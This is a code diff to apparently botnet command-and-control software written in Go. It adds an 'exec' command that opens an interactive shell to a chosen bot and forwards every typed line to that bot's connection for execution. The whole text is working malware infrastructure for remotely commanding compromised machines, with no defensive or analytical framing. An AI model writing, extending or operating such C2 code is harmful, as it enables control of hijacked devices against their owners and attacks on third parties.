@@ -89,6 +89,38 @@ func (cnc *CNC) command(client *Client, line string) {
 			cnc.write(fmt.Sprintf("%s: %d\n", arch, count), client)
 		}
 
+	} else if cmd == "exec" {
+		if len(args) != 1 {
+			cnc.write("\rMissing Arguments\n\n", client)
+			return
+		}
+
+		found := false
+		cnc.write("\rExecute commands on a bot\n\n", client)
+		for _, bot := range cnc.Bots {
+			if bot.name == args[0] {
+				found = true
+
+				for {
+					cnc.write(fmt.Sprintf("\r%s > ", bot.name), client)
+					command, _ := cnc.readline(client)
+
+					if command == ".exit" ||command == ".quit" || command == ".q" {
+						break
+					} else if command == ".clear" {
+						cnc.write("\033[2J\033[1;1H", client)
+					}
+
+					bot.conn.Write([]byte(command))
+				}
+
+			}
+		}
+
+		if !found {
+			cnc.write(fmt.Sprintf("\rBot '%s' not found\n\n", args[0]), client)
+		}
+
 	} else if cmd == "clients" {
 		for _, cli := range cnc.Clients {
 			if cli.alive {
@@ -249,5 +281,3 @@ func (cnc *CNC) Start() {
 		go cnc.connection(client)
 	}
 }
-
-// Did i do something here?
